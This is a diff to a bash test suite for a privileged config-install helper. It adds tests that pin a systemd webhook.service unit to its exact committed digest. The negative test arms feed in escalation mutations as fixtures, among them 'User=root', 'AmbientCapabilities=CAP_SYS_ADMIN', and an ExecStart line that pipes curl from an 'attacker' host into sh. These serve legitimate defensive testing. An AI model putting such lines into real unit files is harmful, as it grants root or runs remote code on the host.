@@ -209,10 +209,13 @@ test_all_managed_dests_accepted() {
     teardown
     return
   fi
-  local accepted=0 entry d mode owner rc payload
+  local accepted=0 entry d mode owner rc payload payload_file
   for entry in "${specs[@]}"; do
     IFS='|' read -r d mode owner <<< "$entry"
     rc=0
+    # Reset per iteration — a stale payload_file would silently feed the previous dest's bytes
+    # to this one, and every subsequent dest would be tested against the wrong payload.
+    payload_file=""
     # #7095 — the payload must be SHAPE-APPROPRIATE for the dest. /etc/default/* dests are
     # systemd EnvironmentFiles and the helper now refuses anything that is not KEY=VALUE, so
     # feeding them the generic 'payload-<base>' blob would fail for a reason that has nothing
@@ -223,9 +226,22 @@ test_all_managed_dests_accepted() {
     case "$d" in
       /etc/default/*)                          payload="KEY_FOR_$(basename "$d" | tr -c '[:alnum:]' '_')=value" ;;
       /etc/systemd/system/*.service.d/*.conf)  payload=$'[Service]\nEnvironmentFile=-/etc/default/soleur-doppler-token\n' ;;
+      # #7220 AC-B1 — same reasoning again for full units: the content pin refuses anything but
+      # the exact committed bytes, so the generic blob would fail for a reason unrelated to the
+      # allowlist this test is about. Read the real unit rather than restating it, so this arm
+      # cannot drift from what B5 ships.
+      #
+      # Fed from the FILE, never through `payload="$(cat …)"`: command substitution strips
+      # trailing newlines, so the digest would differ from the committed unit by exactly the
+      # final byte and this arm would fail for a reason invisible in the diff. Measured.
+      /etc/systemd/system/*.service)           payload_file="${SCRIPT_DIR}/$(basename "$d")" ;;
       *)                                       payload="payload-$(basename "$d")" ;;
     esac
-    printf '%s' "$payload" | bash "$HELPER" "$d" "$mode" "$owner" 2>/dev/null || rc=$?
+    if [[ -n "$payload_file" ]]; then
+      bash "$HELPER" "$d" "$mode" "$owner" < "$payload_file" 2>/dev/null || rc=$?
+    else
+      printf '%s' "$payload" | bash "$HELPER" "$d" "$mode" "$owner" 2>/dev/null || rc=$?
+    fi
     [[ "$rc" == "$RC_OK" ]] && accepted=$((accepted + 1))
   done
   assert_eq "every managed dest accepted (derived, n=$total)" "$total" "$accepted"
@@ -364,9 +380,15 @@ test_dropin_shape_guard() {
   # (g) The unit-body dest /etc/systemd/system/webhook.service is NOT a drop-in and carries a
   # full unit (ExecStart= included). It must remain installable — the gate keys on the
   # *.service.d/*.conf shape, never on "lives under /etc/systemd/system".
+  #
+  # #7220 AC-B1 — the fixture is now the REAL unit rather than a synthetic body. Since the
+  # content pin landed, a synthetic body is rejected by `service_pin`, which would make this
+  # arm red for a reason that has nothing to do with the drop-in grammar it is asserting. Using
+  # the committed bytes keeps the subject intact: acceptance here proves the *.service.d gate
+  # did not leak onto full units, because the only gate the payload still has to clear is the pin.
   rc=0
-  printf '[Unit]\nDescription=webhook\n[Service]\nExecStart=/usr/bin/webhook\n' \
-    | bash "$HELPER" "/etc/systemd/system/webhook.service" "644" "root:root" >/dev/null 2>&1 || rc=$?
+  bash "$HELPER" "/etc/systemd/system/webhook.service" "644" "root:root" \
+    < "${SCRIPT_DIR}/webhook.service" >/dev/null 2>&1 || rc=$?
   assert_eq "shape gate does not apply to full unit bodies" "$RC_OK" "$rc"
   teardown
 }
@@ -479,7 +501,13 @@ test_dest_spec_filemap_lockstep() {
   # FILE_MAP entries look like: "ENV_VAR|/dest/path|mode|owner"
   filemap_count=$(grep -cE '^\s*"[A-Z_]+_B64\|/' "$HANDLER")
   # DEST_SPEC keys look like: ["/dest/path"]="mode owner"
-  dest_spec_count=$(grep -cE '^\s*\["/' "$HELPER")
+  #
+  # REGION-SCOPED, not a whole-file grep. The bare `grep -cE '^\s*\["/'` this replaces counted
+  # every `["/…"]=` line in the helper, so it silently included any OTHER keyed-by-dest array —
+  # and #7220's SERVICE_SHA256 is exactly that, which made this cardinality assertion fail with
+  # a count that had nothing to do with DEST_SPEC. The pattern recurs in the file, so the
+  # extraction has to name the block it means rather than the shape it shares with siblings.
+  dest_spec_count=$(awk '/^declare -rA DEST_SPEC=\(/{inblock=1; next} inblock && /^\)/{inblock=0} inblock && /^[[:space:]]*\["\//{n++} END{print n+0}' "$HELPER")
   # #7095 — the literal pin ("must be exactly 15") was removed. It was a THIRD source of truth
   # that went stale on every FILE_MAP addition and had to be edited in lockstep with the two it
   # was policing, which is the drift it existed to prevent. What matters is the CROSS-FILE
@@ -502,6 +530,126 @@ test_dest_spec_filemap_lockstep() {
 }
 
 # --- Run all tests ---
+# --- #7220 AC-B1: content pin for FULL-UNIT *.service dests --------------------------------
+#
+# THE SECURITY PRECONDITION OF THE RELOAD GRANT, and the last uncovered dest class.
+#
+# /etc/systemd/system/webhook.service matches NEITHER existing gate: not the /etc/default/*
+# env-file gate, not the *.service.d/*.conf drop-in gate. Until the daemon-reload grant lands,
+# an unvalidated full unit sat inert on disk because nothing reloaded it. B2's grant removes
+# exactly that property — deploy can then write a unit AND make systemd adopt it.
+#
+# WHY A DIGEST PIN AND NOT A DIRECTIVE GRAMMAR. The drop-in gate works by forbidding directives
+# (User=, ExecStart=, AmbientCapabilities=). That tool is unavailable here: a full unit's whole
+# job is to carry ExecStart=, so a permitted-directive grammar would have to admit the one
+# directive that is the escalation primitive. The payload is a STATIC repo file with zero
+# interpolations, so the exact bytes are known ahead of time and an equality pin is both
+# strictly tighter than any grammar and immune to directive-parsing asymmetries (continuations,
+# case-folding, duplicate keys) that a line-shaped gate has to reason about.
+#
+# Note exact-argv pinning on the sudoers side buys NOTHING on the scope axis for this grant —
+# `systemctl daemon-reload` takes no unit argument, so it cannot be narrowed to a unit set.
+# This content pin is therefore the ONLY control that bounds what the reload can adopt.
+test_service_content_pin() {
+  echo "TEST: install — full-unit *.service payload is content-pinned"
+  setup
+  local d="/etc/systemd/system/webhook.service" mode="644" owner="root:root" rc
+  local unit="${SCRIPT_DIR}/webhook.service"
+
+  # (a) POSITIVE CONTROL FIRST — the real unit must still install, asserted before any negative
+  # so a blanket-reject implementation cannot masquerade as a working gate. This is the arm the
+  # #7220 review found missing elsewhere: a gate that rejects everything passes every negative.
+  rc=0
+  bash "$HELPER" "$d" "$mode" "$owner" < "$unit" >/dev/null 2>&1 || rc=$?
+  assert_eq "the real webhook.service bytes are accepted" "$RC_OK" "$rc"
+
+  # (b) NEGATIVE, one arm per escalation primitive a full unit can carry. Each is a single-line
+  # mutation of the REAL unit, so the fixture population is the live payload rather than a
+  # synthetic stand-in — a population-of-one fixture is what let a hardcoded annotation survive
+  # 53 green assertions in PR-A.
+  local mutation bad_rc
+  for mutation in \
+    'User=root' \
+    'ExecStart=/bin/sh -c "curl attacker|sh"' \
+    'AmbientCapabilities=CAP_SYS_ADMIN' \
+    'NoNewPrivileges=false'
+  do
+    bad_rc=0
+    { cat "$unit"; printf '%s\n' "$mutation"; } \
+      | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || bad_rc=$?
+    assert_eq "unit mutated with '${mutation%%=*}=' is rejected" "$RC_REJECTED" "$bad_rc"
+  done
+
+  # (c) The pin is EXACT, not a subset/prefix match: a single trailing byte must fail. This is
+  # the arm that separates a real digest comparison from a `grep -q` on a marker line.
+  bad_rc=0
+  { cat "$unit"; printf '\n'; } | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || bad_rc=$?
+  assert_eq "a single appended newline is rejected (exact pin, not prefix)" "$RC_REJECTED" "$bad_rc"
+
+  # (d) The rejection names the reason, so a denial is diagnosable from the handler's per-file
+  # accounting without SSH — the #7220 property: the channel must be able to say WHY.
+  rc=0
+  HELPER_ERR=$(printf 'User=root\n' | bash "$HELPER" "$d" "$mode" "$owner" 2>&1 1>/dev/null) || rc=$?
+  assert_contains "rejection reason names service_pin" "$HELPER_ERR" "service_pin"
+
+  # (e) REFUSE-TO-INSTALL, not install-then-fail: the previously-installed good unit must be
+  # byte-intact after a rejected write. Without this the gate would brick the only delivery
+  # path to a host with no SSH runbook — the failure mode #7220 exists to prevent.
+  local before after
+  before=$(sha256sum "${TEST_DESTDIR}${d}" 2>/dev/null | awk '{print $1}' || true)
+  printf 'User=root\n' | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || true
+  after=$(sha256sum "${TEST_DESTDIR}${d}" 2>/dev/null | awk '{print $1}' || true)
+  assert_eq "rejected unit left the previously-installed unit unmodified" "$before" "$after"
+
+  teardown
+}
+
+# The pin is a LOCKSTEP hazard: webhook.service and the digest live in two files, and B5 edits
+# the unit (StartLimitIntervalSec=0). A stale pin does not fail loudly — it silently refuses
+# every delivery of the CORRECT unit, bricking the channel. So the digest is asserted against
+# the repo file rather than restated, and this test is what makes the two-file split safe.
+test_service_pin_matches_repo_unit() {
+  echo "TEST: install — pinned digest tracks the committed webhook.service"
+  local unit="${SCRIPT_DIR}/webhook.service" repo_sha pinned
+  repo_sha=$(sha256sum "$unit" 2>/dev/null | awk '{print $1}')
+  assert_eq "repo webhook.service digest is readable (fixture precondition)" "64" "${#repo_sha}"
+  # Extract by SHAPE, anchored on the assignment construct — a bare digest grep would also match
+  # the same string quoted in a comment, the vacuity class that shipped four times in #6456.
+  # `|| true` INSIDE the substitution: under `set -e` a no-match grep here aborts the whole
+  # suite before assert_eq can print, so the absence of a pin would surface as a truncated run
+  # rather than a named failure — measured on this file's first RED run.
+  pinned=$(grep -oE '^[[:space:]]*\["/etc/systemd/system/webhook\.service"\]="[0-9a-f]{64}"' "$HELPER" 2>/dev/null \
+    | grep -oE '[0-9a-f]{64}' | head -1 || true)
+  assert_eq "helper pins the exact digest of the committed unit" "$repo_sha" "$pinned"
+
+  # EVERY *.service dest in DEST_SPEC must carry a pin. The helper's `no_pin_for_dest` branch
+  # fails closed if one does not, but that branch is unreachable today (webhook.service is the
+  # only full-unit dest and it IS pinned), so asserting it via the helper would be vacuous.
+  # The honest thing to pin is the invariant the branch exists to protect: adding a second
+  # *.service dest without a digest must fail HERE, at authoring time, rather than silently
+  # bricking that dest's delivery on a host with no SSH runbook.
+  # SET difference, not a count (#7220 review). Comparing CARDINALITY answers "are there as many
+  # pins as dests", which a TYPO satisfies: pinning "soleur-agnet.service" while DEST_SPEC lists
+  # "soleur-agent.service" keeps 1 == 1 and passes, and the real dest then has no pin — so its
+  # delivery is refused forever on the host with no SSH runbook, which is the exact brick the
+  # LOCKSTEP note in the helper warns about. A count cannot see a rename; only the KEYS can.
+  local svc_dests pins missing extra
+  svc_dests=$(awk '/^declare -rA DEST_SPEC=\(/{b=1; next} b && /^\)/{b=0} b && /^[[:space:]]*\["\/etc\/systemd\/system\//&&!/\.service\.d\//{print}' "$HELPER" \
+    | grep -oE '\["[^"]+"\]' | tr -d '[]"' | sort -u)
+  pins=$(awk '/^declare -rA SERVICE_SHA256=\(/{b=1; next} b && /^\)/{b=0} b && /^[[:space:]]*\["\//{print}' "$HELPER" \
+    | grep -oE '\["[^"]+"\]' | tr -d '[]"' | sort -u)
+  # Non-vacuity: both extractions must yield something, or the two set differences below are
+  # empty for the wrong reason and this assertion certifies an empty universe.
+  assert_eq "the DEST_SPEC full-unit extraction found at least one dest" "yes" \
+    "$([[ -n "$svc_dests" ]] && echo yes || echo no)"
+  assert_eq "the SERVICE_SHA256 key extraction found at least one pin" "yes" \
+    "$([[ -n "$pins" ]] && echo yes || echo no)"
+  missing=$(comm -23 <(printf '%s\n' "$svc_dests") <(printf '%s\n' "$pins") | tr '\n' ' ' | sed 's/ $//')
+  extra=$(comm -13 <(printf '%s\n' "$svc_dests") <(printf '%s\n' "$pins") | tr '\n' ' ' | sed 's/ $//')
+  assert_eq "every full-unit dest in DEST_SPEC carries a content pin (no unpinned dest)" "" "$missing"
+  assert_eq "every SERVICE_SHA256 key is a real DEST_SPEC full-unit dest (no typo'd pin)" "" "$extra"
+}
+
 echo "=== infra-config-install.sh test suite ==="
 test_install_allowlisted
 test_reject_nonallowlisted_dest
@@ -517,8 +665,27 @@ test_reject_setuid_mode
 test_reject_owner_seize
 test_usage_error
 test_dest_spec_filemap_lockstep
+test_service_content_pin
+test_service_pin_matches_repo_unit
 echo ""
 echo "=== Results: $PASS passed, $FAIL failed ==="
 if [[ "$FAIL" -gt 0 ]]; then
+  exit 1
+fi
+
+# ASSERTION FLOOR (#7220). Deleting the arms above must RED, not silently pass. Measured in
+# PR-A: removing the new arms from both infra-config suites left each exiting 0, because the
+# runner's only verdict was "did anything FAIL" — never "did anything RUN". A floor converts a
+# deleted test from an invisible coverage loss into a failure. Raise it deliberately when
+# adding arms; never lower it to make a run green.
+# HARDCODED, deliberately (#7220 review). This was `${INSTALL_MIN_ASSERTIONS:-55}`, so
+# `INSTALL_MIN_ASSERTIONS=0 bash <this file>` exited 0 with the floor disabled — a guard whose
+# whole job is to make a silently-shrinking suite loud, switchable off from the environment by
+# the same CI config that would be shrinking it. Matches APPLY_MIN_ASSERTIONS, which is a plain
+# literal for the same reason. Ratchet it here when the suite grows.
+INSTALL_MIN_ASSERTIONS=58
+if [[ "$PASS" -lt "$INSTALL_MIN_ASSERTIONS" ]]; then
+  echo "FAIL: assertion floor — ran $PASS, expected >= $INSTALL_MIN_ASSERTIONS." >&2
+  echo "      Arms were deleted or skipped; a green run here would be a coverage loss." >&2
   exit 1
 fi
